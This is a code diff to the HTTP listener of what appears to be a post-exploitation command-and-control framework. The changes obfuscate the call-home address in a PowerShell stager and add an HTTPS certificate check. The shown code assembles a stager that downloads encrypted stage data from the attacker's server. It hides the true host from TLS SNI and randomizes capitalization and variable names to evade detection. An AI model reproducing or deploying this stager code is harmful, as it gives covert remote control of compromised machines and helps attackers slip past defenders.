@@ -116,7 +116,7 @@ class Listener:
                 'Description'   :   'Custom Cookie Name',
                 'Required'      :   False,
                 'Value'         :   ''
-            },            
+            },
             'StagerURI' : {
                 'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
@@ -258,7 +258,10 @@ class Listener:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                 print helpers.color("[!] Option \"%s\" is required." % (key))
                 return False
-
+        # If we've selected an HTTPS listener without specifying CertPath, let us know.
+        if self.options['Host']['Value'].startswith('https') and self.options['CertPath']['Value'] == '':
+            print helpers.color("[!] HTTPS selected but no CertPath specified.")
+            return False
         return True
 
 
@@ -398,7 +401,8 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -408,14 +412,14 @@ class Listener:
                         #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                         if headerKey.lower() == "host":
                             stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
- 
+
                         stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
-                
+
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -577,7 +581,7 @@ class Listener:
                     value = key.split(":")
                     if 'cookie' in value[0].lower() and value[1]:
                         continue
-                    remove += value    
+                    remove += value
                 headers = ','.join(remove)
                 #headers = ','.join(customHeaders)
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
@@ -828,7 +832,7 @@ class Listener:
                         }
                     }
                 """
-                
+
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
@@ -885,7 +889,7 @@ def send_message(packets=None):
         return (URLerror.reason, '')
 
     return ('', '')
-""" 
+"""
                 return updateServers + sendMessage
 
             else:
@@ -1196,7 +1200,6 @@ def send_message(packets=None):
             print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
             listenerName = self.options['Name']['Value']
             message = "[!] Listener startup on port {} failed: {}".format(port, e)
-            message += "\n[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."
             signal = json.dumps({
                 'print': True,
                 'message': message
@@ -1246,4 +1249,4 @@ def send_message(packets=None):
         chars = string.letters
         cookie = helpers.random_string(random.randint(6,16), charset=chars)
 
-        return cookie            
+        return cookie
